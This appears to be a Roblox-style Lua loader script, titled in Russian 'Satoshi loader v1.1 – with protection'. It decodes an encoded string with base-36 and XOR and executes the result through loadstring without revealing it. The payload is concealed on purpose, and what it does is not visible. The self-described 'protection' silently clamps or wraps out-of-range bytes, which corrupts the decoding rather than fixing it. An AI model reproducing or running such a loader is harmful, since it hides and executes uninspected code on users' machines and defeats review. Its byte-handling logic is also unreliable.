-- [ ЗАГРУЗЧИК САТОШИ v1.1 - С ЗАЩИТОЙ ] --

local encrypted_data = "35.6.8.e.b.z.l.y.c.f.g.2a.16.n.m.u.2x.1k.x.1c.1b.1u.u.1e.2z.2x.t.1n.1f.1o.14.36.2u.2u.1f.1f.1e.30.1g.16.1r.1c.1m.1i.24.1y.1i.24.22.1l.1j.2b.1o.1i.1x.3i.1u.1q.22.3h.23.1r.2f.2l.26.2g.48.21.20.23.26.3v.2s.3z.2a.28.2s.26.2l.2h.2c.2f.4g.2f.34.2f.2j.4c.2y.2v.2r.2l.3b.3h.4r.2q.34.2z.4w.4m.4w.4s.56.5m" 
local secret_key = "zhjkbn"

local function decrypt(data, key)
    local decrypted = ""
    local i = 1
    
    for part in string.gmatch(data, "[^%.]+") do
        local val = tonumber(part, 36)
        local xor_val = val - i
        local key_byte = string.byte(key, (i - 1) % #key + 1)
        local original_byte = bit32.bxor(xor_val, key_byte)
        
        -- ВОТ ТУТ ЗАЩИТА:
        -- Если число не в диапазоне 0-255, мы его принудительно обрезаем
        -- Это спасет от ошибки invalid value
        if original_byte < 0 then original_byte = 0 end
        if original_byte > 255 then original_byte = original_byte % 256 end
        
        decrypted = decrypted .. string.char(original_byte)
        i = i + 1
    end
    return decrypted
end

local success, result = pcall(decrypt, encrypted_data, secret_key)

if success then
    local func, err = loadstring(result)
    if func then
        func()
    else
        warn("Ошибка в коде: " .. tostring(err))
    end
else
    warn("Ошибка расшифровки: " .. tostring(result))
end
